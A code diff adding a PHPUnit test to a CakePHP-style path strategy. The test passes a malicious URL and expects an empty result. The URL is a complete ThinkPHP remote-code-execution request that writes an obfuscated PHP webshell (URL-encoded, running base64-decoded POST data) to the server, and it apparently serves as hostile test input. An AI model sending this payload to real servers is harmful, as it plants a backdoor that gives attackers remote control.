@@ -182,6 +182,13 @@ class CakePathStrategyTest extends TestCase
         $this->assertEquals($expected, $result);
     }
 
+    public function testCakeInvalidRouteError()
+    {
+        $result = $this->Strategy->setUrl('/index.php?s=index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=asdasdasd.php&vars[1][1]=%3C%3F%70%68%70%0D%0A%63%6C%61%73%73%20%53%59%58%5A%7B%0D%0A%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%5F%5F%64%65%73%74%72%75%63%74%28%29%7B%0D%0A%20%20%20%20%20%20%20%20%24%4C%53%55%4F%3D%22%56%44%4A%36%30%32%22%5E%22%5C%78%33%37%5C%78%33%37%5C%78%33%39%5C%78%35%33%5C%78%34%32%5C%78%34%36%22%3B%0D%0A%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%40%24%4C%53%55%4F%28%22%24%74%68%69%73%2D%3E%4D%4B%4D%55%22%29%3B%0D%0A%20%20%20%20%7D%0D%0A%7D%0D%0A%24%73%79%78%7A%3D%6E%65%77%20%53%59%58%5A%28%29%3B%0D%0A%40%24%73%79%78%7A%2D%3E%4D%4B%4D%55%3D%69%73%73%65%74%28%24%5F%47%45%54%5B%22%69%64%22%5D%29%3F%62%61%73%65%36%34%5F%64%65%63%6F%64%65%28%24%5F%50%4F%53%54%5B%22%39%30%39%30%22%5D%29%3A%24%5F%50%4F%53%54%5B%22%39%30%39%30%22%5D%3B%0D%0A%3F%3E')->getActivePath($this->getBasicHashMenuItems());
+        $expected = [];
+        $this->assertEquals($expected, $result);
+    }
+
     // TODO: implement this functionality (and verify test is correct)
     // public function testQuerystringValues()
     // {
